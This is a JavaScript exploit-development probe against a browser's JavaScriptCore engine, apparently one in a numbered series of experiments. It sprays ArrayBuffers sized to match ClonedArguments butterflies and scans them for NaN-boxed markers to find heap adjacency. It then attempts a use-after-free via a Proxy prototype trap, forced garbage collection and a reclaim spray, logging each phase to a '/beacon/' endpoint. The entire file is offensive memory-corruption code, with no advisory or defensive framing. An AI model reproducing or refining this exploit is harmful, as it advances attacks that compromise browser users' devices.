// p243 - Heap feng shui: adjacent ArrayBuffer + ClonedArguments butterfly
// Strategy: since Gigacage is disabled, ArrayBuffer backing stores and
// butterfly allocations share the same heap. Allocate many ArrayBuffers
// of butterfly-matching size, create ClonedArguments between them,
// then probe for adjacency via marker values.
//
// Goal: find an ArrayBuffer whose backing store is adjacent to
// a butterfly, enabling read/write of butterfly JSValues.
//
// Beacon prefix: V243-

(function() {
  var beaconQ = [];
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var url = '/beacon/V243-' + tag + '?t=' + Date.now();
      if (body) {
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(String(body).substring(0, 900));
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch(e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  // Phase 1: Determine butterfly size for N=8 ClonedArguments
  // Butterfly layout: outOfLineCapacity(4)*8 + IndexingHeader(8) + N*8
  // For N=8: 32 + 8 + 64 = 104 bytes
  // bmalloc rounds up. Likely size class: 112 or 128 bytes
  // We'll try multiple sizes

  var NARGS = 8;
  var BUTTERFLY_APPROX = 104; // 4*8 + 8 + 8*8
  var MARKER = 3.14159265; // recognizable float64 value
  var MARKER2 = 2.71828182;

  // Phase 2: Heap spray - fill heap with ArrayBuffers
  // Use exact butterfly size to maximize chance of adjacency
  var SPRAY_COUNT = 5000;
  var sprayBufs = [];
  var sprayViews = [];

  try {
    for (var i = 0; i < SPRAY_COUNT; i++) {
      // Try 112 bytes (likely bmalloc size class for 104)
      var ab = new ArrayBuffer(112);
      var f64 = new Float64Array(ab);
      // Fill with known markers
      for (var j = 0; j < f64.length; j++) {
        f64[j] = 1e100 + i * 1000 + j; // unique per buffer per slot
      }
      sprayBufs.push(ab);
      sprayViews.push(f64);
    }
    B('SPRAY-OK-' + SPRAY_COUNT);
  } catch(e) {
    B('SPRAY-ERR-' + e.message.substring(0, 40));
  }

  // Phase 3: Create ClonedArguments interspersed
  // These should allocate butterflies from the same heap region
  function mkArgs() { return arguments; }
  var argsList = [];

  try {
    for (var i = 0; i < 200; i++) {
      // Use recognizable argument values
      // Each arg is a tagged integer: 0x11110000 + index
      var a = mkArgs(
        0x11110001 + i * 0x100,
        0x11110002 + i * 0x100,
        0x11110003 + i * 0x100,
        0x11110004 + i * 0x100,
        0x11110005 + i * 0x100,
        0x11110006 + i * 0x100,
        0x11110007 + i * 0x100,
        0x11110008 + i * 0x100
      );
      argsList.push(a);
    }
    B('ARGS-OK-' + argsList.length);
  } catch(e) {
    B('ARGS-ERR-' + e.message.substring(0, 40));
  }

  // Phase 4: Now check each ArrayBuffer for adjacent butterfly data
  // A butterfly stores JSValues. On 64-bit, JSC NaN-boxes:
  // - Integer N: 0xFFFE000000000000 | N
  // - Double: NaN-boxed IEEE 754
  // - Pointer: raw pointer (when Gigacage off, low bits)
  //
  // Our arguments are small integers (0x11110001 etc).
  // As NaN-boxed int32: high32 = 0xFFFE0000, low32 = value
  // As Float64: this is a NaN with specific payload
  //
  // Scan ArrayBuffer backing stores for these patterns

  var INT_TAG_HI = 0xFFFE0000;
  var hits = [];

  try {
    for (var i = 0; i < sprayBufs.length; i++) {
      var dv = new DataView(sprayBufs[i]);
      var found = false;
      for (var off = 0; off < sprayBufs[i].byteLength; off += 8) {
        var hi = dv.getUint32(off + 4, true); // little-endian high 32
        var lo = dv.getUint32(off, true);      // little-endian low 32
        // Check if this looks like a NaN-boxed int in our range
        if (hi === INT_TAG_HI && (lo & 0xFFFF0000) === 0x11110000) {
          found = true;
          hits.push({buf: i, offset: off, hi: hi, lo: lo});
          if (hits.length >= 10) break;
        }
      }
      if (hits.length >= 10) break;
    }
    B('SCAN-HITS-' + hits.length);
    if (hits.length > 0) {
      var detail = hits.map(function(h) {
        return 'b' + h.buf + '@' + h.offset + '=' + hex(h.hi) + hex(h.lo);
      }).join(' ');
      B('SCAN-DETAIL', detail);
      B('ADJACENT-FOUND');
    }
  } catch(e) {
    B('SCAN-ERR-' + e.message.substring(0, 40));
  }

  // Phase 5: Alternative - check if ArrayBuffer data appears in ClonedArgs
  // Read each ClonedArgs value and see if any match spray patterns
  try {
    var altHits = [];
    for (var i = 0; i < argsList.length && altHits.length < 5; i++) {
      for (var j = 0; j < argsList[i].length; j++) {
        var v = argsList[i][j];
        if (typeof v === 'number') {
          // Check if value changed from what we set
          var expected = 0x11110001 + i * 0x100 + j;
          if (v !== expected && v !== 0) {
            altHits.push('a' + i + '[' + j + ']=' + hex(v >>> 0) + ' exp=' + hex(expected));
          }
        } else if (typeof v !== 'number') {
          altHits.push('a' + i + '[' + j + ']=type:' + typeof v);
        }
      }
    }
    B('ALT-SCAN-HITS-' + altHits.length);
    if (altHits.length > 0) {
      B('ALT-DETAIL', altHits.join(' '));
    }
  } catch(e) {
    B('ALT-SCAN-ERR-' + e.message.substring(0, 40));
  }

  // Phase 6: UAF with forced GC reclaim attempt
  // Create new ClonedArgs, make holes, use Proxy to:
  // 1. Store butterfly address marker in a global
  // 2. Force GC aggressively (eden + full)
  // 3. Spray exact-size ArrayBuffers
  // 4. Read stale data
  try {
    B('UAF-START');
    var staleResult = null;
    var gcRounds = 0;

    function uafVictim() {
      delete arguments[1];
      delete arguments[3];
      delete arguments[5];

      var self = arguments;
      var trapFired = false;

      Object.setPrototypeOf(arguments, new Proxy({}, {
        get: function(t, prop) {
          if (!trapFired && prop === '1') {
            trapFired = true;
            B('UAF-TRAP');

            // Strategy: don't reallocate butterfly at all.
            // Instead: force aggressive GC to move/compact butterflies
            // Then spray over any freed regions

            // First: convert to ArrayStorage to orphan old butterfly
            try {
              self[0x7fffffff] = 0xBEEF;
              delete self[0x7fffffff];
              B('UAF-CONVERTED');
            } catch(e) {
              B('UAF-CONV-ERR-' + e.message.substring(0, 20));
            }

            // Aggressive GC: force eden and full collections
            // Allocate and throw away lots of GC-tracked objects
            for (var g = 0; g < 10; g++) {
              var junk = new Array(50000);
              for (var j = 0; j < junk.length; j++) {
                junk[j] = {x: j, y: new ArrayBuffer(16)};
              }
              junk = null;
              gcRounds++;
            }
            B('UAF-GC-' + gcRounds);

            // Now spray ArrayBuffers matching old butterfly size
            // Old: outOfLine(4*8) + Header(8) + 8*8 = 104 bytes
            // bmalloc size class ~ 112
            var uafSpray = [];
            for (var s = 0; s < 2000; s++) {
              var ab = new ArrayBuffer(104);
              var u32 = new Uint32Array(ab);
              // Fill with tagged markers
              // Offset 40 in allocation = butterfly data start
              // = Uint32 index 10 (40/4)
              // Each JSValue is 8 bytes = 2 Uint32s
              // JSValue int32 encoding: [low32=value, high32=0xFFFE0000]
              for (var k = 0; k < u32.length; k += 2) {
                u32[k] = 0xCAFE0000 + s;   // low32: marker
                u32[k+1] = 0xFFFE0000;      // high32: int tag
              }
              uafSpray.push(ab);
            }
            B('UAF-SPRAY-' + uafSpray.length);
          }
          return 0xBEEF0000 + (parseInt(prop) || 0);
        }
      }));

      return Array.prototype.slice.call(arguments);
    }

    staleResult = uafVictim(
      0x11111111, 0x22222222, 0x33333333, 0x44444444,
      0x55555555, 0x66666666, 0x77777777, 0x88888888
    );

    if (staleResult) {
      B('UAF-LEN-' + staleResult.length);
      var vals = [];
      var cafeCount = 0;
      for (var r = 0; r < staleResult.length; r++) {
        var v = staleResult[r];
        var u = (typeof v === 'number') ? (v >>> 0) : 0;
        vals.push(r + '=' + hex(u));
        if ((u >>> 16) === 0xCAFE) cafeCount++;
      }
      B('UAF-VALS', vals.join(' '));
      B('UAF-CAFE-' + cafeCount);
      if (cafeCount > 0) {
        B('UAF-RECLAIM-HIT');
      }
    }
  } catch(e) {
    B('UAF-ERR-' + e.message.substring(0, 60));
  }

  B('DONE');
})();
